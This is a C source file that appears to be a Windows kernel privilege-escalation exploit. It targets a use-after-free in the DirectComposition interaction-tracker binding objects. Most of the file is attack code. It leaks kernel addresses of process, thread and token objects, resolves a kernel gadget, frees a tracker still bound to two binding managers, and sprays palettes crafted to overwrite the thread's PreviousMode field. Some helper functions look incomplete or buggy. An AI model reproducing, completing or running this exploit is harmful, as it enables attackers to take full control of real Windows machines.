#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <strsafe.h>
#include <string>
#include <ntstatus.h>
#include <processthreadsapi.h>
#include <tlhelp32.h>
#include "ntos.h"

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    void* BaseAddress,
    const void* SourceBuffer,
    size_t Length,
    size_t* BytesWritten);

typedef struct _EXPLOIT_CONTEXT {
    PPEB pPeb;
    _NtQuerySystemInformation fnNtQuerySystemInformation;
    _NtWriteVirtualMemory fnNtWriteVirtualMemory;

    HANDLE hCurProcessHandle;
    HANDLE hCurThreadHandle;
    DWORD64 dwKernelEprocessAddr;
    DWORD64 dwKernelEthreadAddr;

    DWORD previous_mode_offset;

    DWORD win32_process_offset; // EPROCESS->Win32Process

    DWORD GadgetAddrOffset;
    DWORD ObjectSize;
}EXPLOIT_CONTEXT, * PEXPLOIT_CONTEXT;

PEXPLOIT_CONTEXT g_pExploitCtx;

typedef NTSTATUS(*pNtDCompositionCreateChannel)(
    OUT PHANDLE pArgChannelHandle,
    IN OUT PSIZE_T pArgSectionSize,
    OUT PVOID* pArgSectionBaseMapInProcess
    );

typedef NTSTATUS(*pNtDCompositionProcessChannelBatchBuffer)(
    IN HANDLE hChannel,
    IN DWORD dwArgStart,
OUT PDWORD pOutArg1,
OUT PDWORD pOutArg2
);

typedef NTSTATUS(*pNtDCompositionCommitChannel)(
    IN HANDLE pArgChannelHandle,
    OUT LPDWORD out1,
    OUT LPBOOL out2,
    IN BOOL in1,
    IN HANDLE in2
    );

enum DCOMPOSITION_COMMAND_ID
{
    ProcessCommandBufferIterator,
    CreateResource,
    OpenSharedResource,
    ReleaseResource,
    GetAnimationTime,
    CapturePointer,
    OpenSharedResourceHandle,
    SetResourceCallbackId,
    SetResourceIntegerProperty,
    SetResourceFloatProperty,
    SetResourceHandleProperty,
    SetResourceHandleArrayProperty,
    SetResourceBufferProperty,
    SetResourceReferenceProperty,
    SetResourceReferenceArrayProperty,
    SetResourceAnimationProperty,
    SetResourceDeletedNotificationTag,
    AddVisualChild,
    RedirectMouseToHwnd,
    SetVisualInputSink,
    RemoveVisualChild
};

#define nCmdCreateResource 0x1
#define nCmdReleaseResource 0x3
#define nCmdSetBufferProperty 0xC
#define CInteractionTrackerBindingManagerMarshaler 0x59
#define CInteractionTrackerMarshaler 0x58

HANDLE hChannel;
PVOID pMappedAddress = NULL;  SIZE_T SectionSize = 0x4000;
DWORD dwArg1, dwArg2;
DWORD szBuff[0x400];

#define Binding1 1
#define Binding2 2 
#define Tracker1 3
#define Tracker2 4

pNtDCompositionCreateChannel NtDCompositionCreateChannel;
pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
pNtDCompositionCommitChannel NtDCompositionCommitChannel;


HMODULE GetNOSModule() {
    HMODULE hKern = 0;
    hKern = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    return hKern;
}

DWORD64 GetModuleAddr(const char* name) {
    PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);
    DWORD outBuffer = 0;
    NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);
    
    if (status = STATUS_INFO_LENGTH_MISMATCH) {
        free(buffer);
        buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
        status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
        if (status == STATUS_ACCESS_DENIED) {
            return 0;
        }
    }

    for (int i = 0; i < buffer->NumberOfModules; i++) {
        DWORD kernelImageBase = (DWORD)buffer->Modules[i].ImageBase;
        PCHAR kernelImage = (PCHAR)buffer->Modules[i].FullPathName;
        if (!_stricmp(kernelImage, name)) {
            free(buffer);
            return kernelImageBase;
        }
    }
    free(buffer);
    return 0;
}

DWORD64 GetGadgetAddr(const char* name) {
    DWORD64 base = GetModuleAddr("\\SymtemRoot\\system32\\ntoskrnl.exe");
    HMODULE mod = GetNOSModule();
    if (!mod) {
        printf("[-] leaking ntoskrnl version\n");
        return 0;
    }
    DWORD64 offset = (DWORD64)GetProcAddress(mod, name);
    DWORD64 returnValue = base + offset - (DWORD64)mod;
    FreeLibrary(mod);
    return returnValue;
}

SIZE_T GetObjectKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE object) {
    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
    ULONG handleInfoSize = 0x1000;
    ULONG retLength;
    NTSTATUS status;
    SIZE_T kernelAddress = 0;
    BOOL bFind = FALSE;
    return 0;
}

SIZE_T GetObjKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE obj) {


    PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
    ULONG handleInfoSize = 0x10000;
    ULONG retLength = 0;
    NTSTATUS status = 0;
    SIZE_T kernelAddress = 0;
    BOOL bFind = FALSE;

    while (TRUE) {
        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
        status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
        if (status == STATUS_INFO_LENGTH_MISMATCH || NT_SUCCESS(status)) {
            LocalFree(handleInfo);

            handleInfoSize = retLength + 0x100;
            handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
            status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
            if (NT_SUCCESS(status)) {
                for (int i = 0; i < handleInfo->NumberOfHandles; i++) {
                    if ((USHORT)obj == 0x4) {
                        if (0x4 == handleInfo->Handles[i].UniqueProcessId && (SIZE_T)handleInfo->Handles[i].HandleValue) {
                            kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
                            bFind = TRUE;
                            break;
                        }
                    }
                    else {
                        if ((DWORD)GetCurrentProcess() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)handleInfo->Handles[i].HandleValue) {
                            kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
                            bFind = TRUE;
                            break;
                        }
                    }
                }
            }
        }
        if (handleInfo)
            LocalFree(handleInfo);
        if (bFind)
            break;
    }
    return kernelAddress;

}

DWORD64 GetKernelPointer(HANDLE handle, DWORD type) {
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);
    DWORD outBuffer = 0;
    NTSTATUS status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);
    if ( status == STATUS_INFO_LENGTH_MISMATCH) {
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        status = g_pExploitCtx->fnNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }
    
    if (!buffer) {
        printf("[-] NtQueryInformation error\n");
        return 0;
    }

    for (int i = 0; i < buffer->NumberOfHandles; i++) {
        DWORD objTypeNumber = buffer->Handles[i].ObjectTypeIndex;
        
        if (buffer->Handles[i].UniqueProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeIndex == type) {
            DWORD64 object = (DWORD64)buffer->Handles[i].Object;
            free(buffer);
            return object;
        }
    }
    printf("[-] handle not found\n");
    free(buffer);
    return 0;
}

BOOL InitEnvironment() {
    g_pExploitCtx = new EXPLOIT_CONTEXT;    
    g_pExploitCtx->fnNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQuerySystemInformation");
    g_pExploitCtx->fnNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtWriteVirtualMemory");
    g_pExploitCtx->pPeb = NtCurrentTeb()->ProcessEnvironmentBlock;

    if (!DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &g_pExploitCtx->hCurProcessHandle, 0, FALSE, DUPLICATE_SAME_ACCESS) ||
        !DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &g_pExploitCtx->hCurThreadHandle, 0, FALSE, DUPLICATE_SAME_ACCESS))
        return FALSE;

    g_pExploitCtx->dwKernelEprocessAddr = GetObjectKernelAddress(g_pExploitCtx, g_pExploitCtx->hCurProcessHandle);
    g_pExploitCtx->dwKernelEthreadAddr = GetObjectKernelAddress(g_pExploitCtx, g_pExploitCtx->hCurThreadHandle);
    
    g_pExploitCtx->win32_process_offset = 0x508;
    g_pExploitCtx->previous_mode_offset = 0x232;
    g_pExploitCtx->GadgetAddrOffset = 0x38;
    g_pExploitCtx->ObjectSize = 0x1d0;

    return TRUE;
}
HPALETTE createPaletteOfSize(int size) {
    int pal_cnt = (size + 0x8c - 0x90) / 4;
    int palsz = sizeof(LOGPALETTE) + sizeof(PALETTEENTRY) * (pal_cnt - 1);
    LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsz);
    DWORD64* p = (DWORD64*)((DWORD)lPalette + 4);

    p[0] = (DWORD64)0xffffffff;
    p[3] = (DWORD64)0x04;
    p[9] = g_pExploitCtx->dwKernelEthreadAddr + g_pExploitCtx->previous_mode_offset - 9 - 8;
    lPalette->palNumEntries = pal_cnt;
    lPalette->palVersion = 0x300;
   
    return CreatePalette(lPalette);
}
int main(int argc, TCHAR* argv[])
{
    if (!InitEnvironment()) {
        printf("[-]Inappropriate Operating System\n");
        return 0;
    }

    LoadLibrary(L"user32.dll");

    DWORD64* Ptr = (DWORD64*)0xffffffff;
    DWORD64 GadgetAddr = GetGadgetAddr("SeSetAccessStateGenericMapping");
    //memset(Ptr, 0xff, 0x1000);

    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    if (!proc) {
        printf("[-] OpenProcess fail\n");
        return 0;
    }
    HANDLE token = 0;
    if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token)) {
        printf("[-] OpenProcessToken fail\n");
        return 0;
    }

    DWORD64 kToken = GetKernelPointer(token, 0x5);
    NTSTATUS ntStatus;
    HMODULE win32u = LoadLibrary(L"win32u.dll");
    NtDCompositionCreateChannel = (pNtDCompositionCreateChannel)GetProcAddress(win32u, "NtDCompositionCreateChannel");
    NtDCompositionProcessChannelBatchBuffer = (pNtDCompositionProcessChannelBatchBuffer)GetProcAddress(win32u, "NtDCompositionProcessChannelBatchBuffer");
    NtDCompositionCommitChannel = (pNtDCompositionCommitChannel)GetProcAddress(win32u, "NtDCompositionCommitChannel");

    ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
    if (!NT_SUCCESS(ntStatus)) {
        printf("Fail to create DComposition Channel\n");
        exit(-1);
    }
    HANDLE hChannel;
    PVOID pMappedAddress = NULL;  SIZE_T SectionSize = 0x4000;
    DWORD dwArg1, dwArg2;
    NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
    printf("[+] Create channel:%d\n", hChannel);

    *(DWORD*)pMappedAddress = nCmdCreateResource;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding1;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create TrackerBinding1\n");
        exit(-1);
    }
    printf("[+] Create TrackerBinding1\n");

    *(DWORD*)pMappedAddress = nCmdCreateResource;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding2;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = CInteractionTrackerBindingManagerMarshaler;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create TrackerBingin2\n");
        exit(-1);
    }
    printf("[+] Create TrackerBingin2\n");

    *(DWORD*)pMappedAddress = nCmdCreateResource;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Tracker1;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = CInteractionTrackerMarshaler;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = FALSE;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Tracker1\n");
        exit(-1);
    }
    printf("[+] Create Tracker1\n");
    szBuff[0] = Tracker1;
    szBuff[1] = Tracker1;
    szBuff[2] = 0x41414141;
    UINT datasz = 0xc;
    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding1;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = 0;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = datasz;
    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasz);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasz, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to binding Tracker1 to TrackerBingin1\n");
        exit(-1);
    }
    printf("[+] Binding Tracker1 to TrackerBinding1\n");

    szBuff[0] = Tracker1;
    szBuff[1] = Tracker1;
    szBuff[2] = 0x41414141;
    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
    *(HANDLE*)((PCHAR)pMappedAddress + 4) = (HANDLE)Binding2;
    *(DWORD*)((PCHAR)pMappedAddress + 8) = 0;
    *(DWORD*)((PCHAR)pMappedAddress + 0xc) = datasz;
    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasz);
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasz, &dwArg1, &dwArg2);

    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to binding Tracker1 to TrackerBingin2\n");
        exit(-1);
    }
    printf("[+] Binding Tracker1 to TrackerBinding2\n");

    *(DWORD*)pMappedAddress = nCmdReleaseResource;
    *(DWORD*)((PCHAR)pMappedAddress + 4) = Tracker1;
    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to Release Resource Tracker1\n");
        exit(-1);
    }
    printf("[+] Release Resource Tracker1\n");

    for (size_t i = 0; i < 0x5000; i++)
    {
        createPaletteOfSize(g_pExploitCtx->ObjectSize);
    }

      
}